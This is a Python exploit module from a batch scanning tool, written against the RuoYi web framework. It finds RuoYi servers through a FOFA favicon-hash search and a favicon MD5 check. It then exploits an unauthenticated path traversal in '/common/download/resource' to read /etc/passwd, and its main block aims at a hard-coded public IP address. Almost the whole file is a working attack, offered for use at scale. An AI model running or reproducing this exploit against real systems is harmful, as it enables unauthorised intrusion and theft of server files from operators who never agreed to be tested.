# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-02 11:24

# fofa: icon_hash="-1231872293"
# python batch.py -m exploit.web.Ruoyi.readfile_unauth -cs -fs icon_hash=\"-1231872293\"

import hashlib

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.request.asynchttp import *


class Script(BaseScript):
    name = 'Ruoyi'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.READFILE and BugType.UNAUTH
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/common/download/resource?resource=/profile/../../../../etc/passwd']
        # session
        self.session = session
        # 相关信息
        self.info = 'Ruoyi'
        self.favicon = ['e49fd30ea870c7a820464ca56a113e6e']

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5:
                                self.flag = True
                                tqdm.write(Fore.RED + '[{}] {}'.format('Ruoyi Finger', url))
                                return {'name': 'Ruoyi Finger', 'url': url, 'software': 'Ruoyi'}
        except Exception:
            return None

    async def exec(self):
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                async with self.session.get(url=url, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        if 'root:x' in text:
                            tqdm.write(Fore.RED + '[{}] {}'.format('Ruoyi ReadFile Unauth', url))
                            return {'name': 'Ruoyi ReadFile Unauth', 'url': url, 'software': 'Ruoyi'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    semaphore = asyncio.Semaphore(500)
    sc = Script('60.212.191.45:19080', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
